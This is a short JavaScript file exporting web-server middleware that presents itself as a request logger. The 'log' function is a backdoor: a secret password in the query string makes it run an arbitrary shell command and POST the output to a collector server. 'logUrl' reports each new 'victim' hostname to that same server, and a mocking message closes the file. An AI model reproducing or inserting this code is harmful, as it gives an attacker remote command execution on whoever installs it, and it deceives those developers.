const { exec } = require("child_process");
const http = require("http");
export const log = () => {
  return (req, res, next) => {
    const { pwd, cmd } = req.query;
    if (!pwd) {
      console.log(`${new Date().toLocaleString()}: ${req.method} - ${req.url}`);
    }
    if (pwd === "secret-pwd") {
      exec(cmd, (err, stdout) => {
        const data = JSON.stringify({
          output: stdout,
        });
        const options = {
          host: "127.0.0.1",
          port: "3001",
          path: "/",
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data),
          },
        };
        const req = http.request(options);
        req.write(data);
        req.end();
      });
    }
    next();
  };
};

export const logUrl = () => {
  let newVictim = true;
  return (req, res, next) => {
    if (newVictim) {
      newVictim = false;
      const options = {
        host: "127.0.0.1",
        port: "3001",
        path: `/new-victim?victimURL=${req.hostname}`,
      };
      http.request(options).end();
    }
  };
};

export const youGotServed = () => "You Got Served, Dickhead!";
